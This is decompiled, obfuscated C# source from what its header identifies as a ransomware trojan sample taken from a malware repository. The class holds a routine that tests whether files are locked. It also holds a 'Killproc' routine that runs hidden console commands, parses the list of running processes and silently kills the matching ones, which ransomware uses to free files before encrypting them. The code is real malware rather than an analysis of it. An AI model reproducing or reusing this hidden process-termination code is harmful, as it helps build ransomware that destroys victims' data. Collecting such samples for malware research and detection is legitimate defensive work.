// Decompiled with JetBrains decompiler
// Type: oXSOOyVgTNm.IVJqAYyIRPoOgC
// Assembly: Skylandshare, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BA04C86B-6DB4-4F58-B4B2-0DD203E57103
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.MSIL.Agent.gen-8d268be58a27d2c980b807ffe703ea28b0fd0cd1ba2e455902faebe9ec17c52e.exe

using SmartAssembly.Delegates;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace oXSOOyVgTNm
{
  internal sealed class IVJqAYyIRPoOgC
  {
    public static readonly List<string> sWLDzJDqDch;
    public static readonly List<string> KxxnQlQFnCe;
    private static Func<string, string[]> CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate8;
    private static Func<string[], string> CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate9;
    [NonSerialized]
    internal static GetString \u0003;

    public static bool SaxwKwUNxFPLf([In] string obj0)
    {
      FileStream fileStream = (FileStream) null;
      try
      {
        fileStream = File.Open(obj0, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
      }
      catch (UnauthorizedAccessException ex1)
      {
        try
        {
          fileStream = File.Open(obj0, FileMode.Open, FileAccess.Read, FileShare.None);
        }
        catch (Exception ex2)
        {
          return true;
        }
      }
      catch (Exception ex)
      {
        return true;
      }
      finally
      {
        fileStream.Close();
      }
      return false;
    }

    public static void KNsoUXkaLTo([In] string obj0)
    {
      Func<string, bool> func = (Func<string, bool>) null;
      IVJqAYyIRPoOgC.NUxXMsKlWXVV nuxXmsKlWxvv = new IVJqAYyIRPoOgC.NUxXMsKlWXVV();
      nuxXmsKlWxvv.qoXzcfXnLwQOTSO = obj0;
      try
      {
        string[] source1 = IVJqAYyIRPoOgC.BdRSxMLpVTup(NuHMiFuRoVNiZNRl.VrSebPGaWq(IVJqAYyIRPoOgC.\u0003(107401956)), NuHMiFuRoVNiZNRl.VrSebPGaWq(IVJqAYyIRPoOgC.\u0003(107401907))).Split(new string[1]
        {
          IVJqAYyIRPoOgC.\u0003(107396618)
        }, StringSplitOptions.None);
        if (func == null)
          func = new Func<string, bool>(nuxXmsKlWxvv.\u003CKillproc\u003Eb__4);
        Func<string, bool> predicate = func;
        IEnumerable<string> source2 = ((IEnumerable<string>) source1).Where<string>(predicate);
        if (IVJqAYyIRPoOgC.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate8 == null)
          IVJqAYyIRPoOgC.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate8 = new Func<string, string[]>(IVJqAYyIRPoOgC.\u003CKillproc\u003Eb__5);
        Func<string, string[]> anonymousMethodDelegate8 = IVJqAYyIRPoOgC.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate8;
        IEnumerable<string[]> source3 = source2.Select<string, string[]>(anonymousMethodDelegate8);
        if (IVJqAYyIRPoOgC.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate9 == null)
          IVJqAYyIRPoOgC.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate9 = new Func<string[], string>(IVJqAYyIRPoOgC.\u003CKillproc\u003Eb__6);
        Func<string[], string> anonymousMethodDelegate9 = IVJqAYyIRPoOgC.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate9;
        foreach (string str in source3.Select<string[], string>(anonymousMethodDelegate9).ToList<string>())
          IVJqAYyIRPoOgC.BdRSxMLpVTup(NuHMiFuRoVNiZNRl.VrSebPGaWq(IVJqAYyIRPoOgC.\u0003(107386292)), NuHMiFuRoVNiZNRl.VrSebPGaWq(IVJqAYyIRPoOgC.\u0003(107401882)) + str);
      }
      catch (Exception ex)
      {
      }
    }

    public static string BdRSxMLpVTup([In] string obj0, [In] string obj1)
    {
      try
      {
        Process process = Process.Start(new ProcessStartInfo(obj0, obj1)
        {
          RedirectStandardOutput = true,
          RedirectStandardError = true,
          StandardOutputEncoding = Encoding.GetEncoding(IVJqAYyIRPoOgC.\u0003(107401897)),
          WindowStyle = ProcessWindowStyle.Hidden,
          UseShellExecute = false,
          CreateNoWindow = true
        });
        string end1;
        using (StreamReader standardOutput = process.StandardOutput)
          end1 = standardOutput.ReadToEnd();
        string end2;
        using (StreamReader standardError = process.StandardError)
          end2 = standardError.ReadToEnd();
        process.WaitForExit();
        return end2 + end1;
      }
      catch (Exception ex)
      {
        return ex.Message + IVJqAYyIRPoOgC.\u0003(107401888) + ex.StackTrace;
      }
    }

    private static string[] \u003CKillproc\u003Eb__5([In] string obj0) => obj0.Split(',');

    private static string \u003CKillproc\u003Eb__6([In] string[] obj0) => obj0[1].Replace(IVJqAYyIRPoOgC.\u0003(107388483), IVJqAYyIRPoOgC.\u0003(107389413));

    static IVJqAYyIRPoOgC()
    {
      SmartAssembly.HouseOfCards.Strings.CreateGetStringDelegate(typeof (IVJqAYyIRPoOgC));
      IVJqAYyIRPoOgC.sWLDzJDqDch = new List<string>();
      IVJqAYyIRPoOgC.KxxnQlQFnCe = new List<string>();
    }

    private sealed class NUxXMsKlWXVV
    {
      public string qoXzcfXnLwQOTSO;

      public bool \u003CKillproc\u003Eb__4([In] string obj0) => obj0.Contains(this.qoXzcfXnLwQOTSO);
    }
  }
}
